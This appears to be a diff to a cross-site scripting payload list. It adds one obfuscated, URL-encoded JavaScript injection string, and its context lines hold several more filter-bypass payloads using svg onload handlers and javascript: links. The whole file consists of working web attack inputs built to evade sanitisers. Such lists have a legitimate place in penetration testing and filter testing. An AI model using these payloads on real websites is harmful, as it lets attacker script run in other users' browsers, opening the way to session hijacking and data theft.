@@ -1,3 +1,4 @@
+"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 "/><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
 %20%27%3C00%20foo%3D%22%3Ca%2520href%3D%22javascript%3Aalert%28%27XSS-Bypass%27%29%22%3EXSS-CLick%3C%2F00%3E--%2520%2F
  '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-CLick</00>--%20/
